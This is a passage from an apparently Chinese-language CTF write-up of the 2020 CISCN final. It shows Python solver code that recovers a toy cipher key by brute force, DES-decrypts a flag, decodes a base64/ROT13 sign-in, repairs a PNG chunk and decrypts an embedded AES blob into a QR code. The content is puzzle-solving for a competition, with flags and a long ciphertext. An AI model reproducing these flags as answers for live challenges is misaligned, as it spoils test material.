punctuation">(</span>r<span class="token punctuation">,</span>key<span class="token punctuation">)</span>r<span class="token operator">=</span>lock<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token operator">=</span>peak<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token operator">=</span>rise<span class="token punctuation">(</span>r<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"encrypted:"</span><span class="token punctuation">,</span>r<span class="token punctuation">)</span>d<span class="token operator">=</span>DES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>secret<span class="token punctuation">,</span>DES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>flag<span class="token operator">=</span>b<span class="token string">"flagxxxxx...xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><strong>Output:</strong> </p><pre><code>lockrise: [158, 51, 193, 48, 114, 23, 164, 217]k0 ^ k7: 160encrypted: [32, 98, 40, 152, 125, 149, 87, 167]0304eb66ffd8a1e1ee60b7e923c7823da10bb23fba254ab6748137b204133e2a35759572068c3a0c</code></pre><p><strong>加密逻辑：</strong></p><p>input =&gt; sbox =&gt; right shift =&gt; xor key =&gt; sbox =&gt; right shift =&gt; xor key =&gt; output</p><p><strong>求解 flag 逻辑：</strong></p><p>求解 key =&gt; 根据 key 和 encrypted 反向解出 secret =&gt; 用 secret 作密钥 DES 解密 flag</p><p>再来看加密过程，input0 =&gt; sbox =&gt; right shift =&gt; xor k1 =&gt; sbox =&gt; right shift =&gt; xor k2 =&gt; output2.</p><p>反推可以得到 input6 =&gt; sbox =&gt; right shift =&gt; <strong>xor k7</strong> =&gt; sbox =&gt; right shift =&gt; <strong>xor k0</strong> =&gt; output0.</p><p>这样根据 <code>k0 ^ k7 = 160</code> 可以爆破 <code>k0</code> &amp; <code>k7</code> 了。</p><pre class=" language-python"><code class="language-python">secret<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span>r<span class="token operator">=</span>lock<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>r<span class="token operator">=</span>peak<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># [96, 25, 248, 51, 6, 37, 32, 69]</span></code></pre><p>前两步骤加密都是确定的，可以直接从这里入手了。</p><pre class=" language-python"><code class="language-python">r <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">248</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">]</span>lockrise <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">]</span><span class="token keyword">for</span> k7 <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    k0 <span class="token operator">=</span> <span class="token number">160</span> <span class="token operator">^</span> k7    <span class="token keyword">if</span> sbox<span class="token punctuation">[</span>r<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">^</span> k7<span class="token punctuation">]</span> <span class="token operator">^</span> k0 <span class="token operator">==</span> lockrise<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>k0<span class="token punctuation">,</span> k7<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 0 160</span></code></pre><p>得到 k0 和 k7 分别为 0 和 160.</p><p>再将 k0 带入求解 k1.</p><pre class=" language-python"><code class="language-python">k0 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> k1 <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> sbox<span class="token punctuation">[</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> k0<span class="token punctuation">]</span> <span class="token operator">^</span> k1 <span class="token operator">==</span> lockrise<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>k1<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 180</span></code></pre><p>依次求解下去即可得到<code>key</code>。</p><p>或者写个循环求也行。</p><pre class=" language-python"><code class="language-python">key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> sbox<span class="token punctuation">[</span>r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">^</span> k <span class="token operator">==</span> lockrise<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> k<span class="token punctuation">)</span>            key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>k<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># [0, 180, 224, 60, 139, 193, 154, 160]</span></code></pre><p>所以 <code>key</code> 为 <code>[0, 180, 224, 60, 139, 193, 154, 160]</code>。</p><p>而后反过来求解 <code>secret</code>。</p><pre class=" language-python"><code class="language-python">key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">224</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">139</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">inv_rise</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">assert</span> len<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token operator">==</span> len<span class="token punctuation">(</span>k<span class="token punctuation">)</span>    r <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r<span class="token punctuation">.</span>append<span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token keyword">def</span> <span class="token function">inv_peak</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> m<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># left shift</span>    <span class="token keyword">return</span> r<span class="token keyword">def</span> <span class="token function">inv_lock</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> m<span class="token punctuation">:</span>        r<span class="token punctuation">.</span>append<span class="token punctuation">(</span>sbox<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> rencrypted <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">167</span><span class="token punctuation">]</span>x <span class="token operator">=</span> inv_rise<span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> key<span class="token punctuation">)</span>x <span class="token operator">=</span> inv_peak<span class="token punctuation">(</span>x<span class="token punctuation">)</span>x <span class="token operator">=</span> inv_lock<span class="token punctuation">(</span>x<span class="token punctuation">)</span>x <span class="token operator">=</span> inv_rise<span class="token punctuation">(</span>x<span class="token punctuation">,</span> key<span class="token punctuation">)</span>x <span class="token operator">=</span> inv_peak<span class="token punctuation">(</span>x<span class="token punctuation">)</span>x <span class="token operator">=</span> inv_lock<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># [35, 239, 81, 231, 237, 218, 108, 166]</span></code></pre><p>得到 <code>secret</code> 为 <code>[35, 239, 81, 231, 237, 218, 108, 166]</code>。</p><pre class=" language-python"><code class="language-python">secret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span> <span class="token number">237</span><span class="token punctuation">,</span> <span class="token number">218</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">166</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>    <span class="token string">"0304eb66ffd8a1e1ee60b7e923c7823da10bb23fba254ab6748137b204133e2a35759572068c3a0c"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 或者 </span><span class="token comment" spellcheck="true"># import binascii</span><span class="token comment" spellcheck="true"># flag = binascii.unhexlify(</span><span class="token comment" spellcheck="true">#     "0304eb66ffd8a1e1ee60b7e923c7823da10bb23fba254ab6748137b204133e2a35759572068c3a0c")</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> DESd <span class="token operator">=</span> DES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>bytes<span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">,</span> DES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># b'flag{lock_peak_rise_repeat_2333_7481233}'</span></code></pre><p>得到 flag。</p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><blockquote><p>c3ludHt0MmpkZ2dqc2NuYTM2ZWwyfQ==</p></blockquote><p>base64 decode</p><blockquote><p>synt{t2jdggjscna36el2}</p></blockquote><p>凯撒</p><blockquote><p>flag{g2wqttwfpan36ry2}</p></blockquote><h3 id="BadPic"><a href="#BadPic" class="headerlink" title="BadPic"></a>BadPic</h3><p>图片残缺了，拖进 010editor 里一看，发现文件最后面有一堆字符串，base64解密发现以 <code>Salted</code>开头，盲猜用了 openssl 什么加密吧。</p><p>另外 <code>PNG_CHUNK chunk[8]</code> 的 length 为 0。</p><p>于是先手动算了算再试了试长度，是 21535。<em>（有没有什么脚本能直接算的唉，手算感觉好蠢</em></p><p><img src="/2020/10/06/CTF_2020CISCN_final/image-20201006022740538.png" alt="修改length"></p><p>修改后得到完整的图片。</p><p><img src="/2020/10/06/CTF_2020CISCN_final/image-20201006174706848.png" alt="apache"></p><p><code>apache</code>，这个应该就是加密的密钥了。</p><p>把图片末尾的字符串给提取出来，去掉 <code>IDAT</code> 等标识（还是复现的时候发现要这样整），合并两段 chunk。</p><pre><code>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</code></pre><p>然后拿这个去 <a href="https://tool.oschina.net/encrypt" target="_blank" rel="noopener">https://tool.oschina.net/encrypt</a> 在线解密，AES，密钥为 <code>apache</code>。</p><p><img src="/2020/10/06/CTF_2020CISCN_final/image-20201006030709979.png" alt="aes"></p><blockquote><p>或者 <strong>openssl 解密</strong> </p><p>（这参数谁知道就是 aes256 呢，难不成爆破？）</p><p>先把上面的密文存到 <code>enc.txt</code>，而后执行下面的这个，输出保存到 <code>out.txt</code> 文件中。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">cat</span> enc.txt <span class="token operator">|</span> base64 -d <span class="token operator">|</span> openssl enc -aes256 -salt -d -out out.txt -pass pass:apache -md md5</code></pre><blockquote><p>另外大佬提醒说，openssl 1.1版本以上默认的hash不是md5，低版本的是md5。</p></blockquote><p><img src="/2020/10/06/CTF_2020CISCN_final/image-20201006032104223.png" alt="openssl"></p></blockquote><p>得到一堆的01字符串，估计就是二维码了啦！</p><p>统计一下长度为4900，正好70*70.</p><p>写个丑陋的jio本把二维码画出来。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> numpy <span class="token keyword">as</span> nptable <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>int<span class="token punctuation">)</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> row <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            table<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            table<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>        i <span class="token operator">+=</span> <span class="token number">1</span>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">255</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> row<span class="token punctuation">]</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> table<span class="token punctuation">]</span>qrcode <span class="token operator">=</span> Image<span class="token punctuation">.</span>fromarray<span class="token punctuation">(</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">(</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>qrcode<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>qrcode<span class="token punctuation">.</span>save<span class="token punctuation">(</span>r<span class="token string">"./qr.png"</span><span class="token punctuation">)</span></code></pre><p>得到二维码如下。</p><p><img src="/2020/10/06/CTF_2020CISCN_final/qr.png" alt="qr"></p><p>扫码得到 flag。</p><p><img src="/2020/10/06/CTF_2020CISCN_final/image-20201006031143135.png" alt="qrcode"></p><p><code>flag{lakks1qw23eeeaw345tywqiqajsajdwajdai}</code></p><p><em>（寻思着现场断网环境做出来也太强了吧，怕不是 openssl 参数掌握的很熟练，要不然就是偷偷上网了？</em> </p><p><em>（Misc 碰上 Crypto 就很头秃</em>  <small>（小声bb</small></p><hr><h2 id="Web"><a href="#Web" class="headerlink" 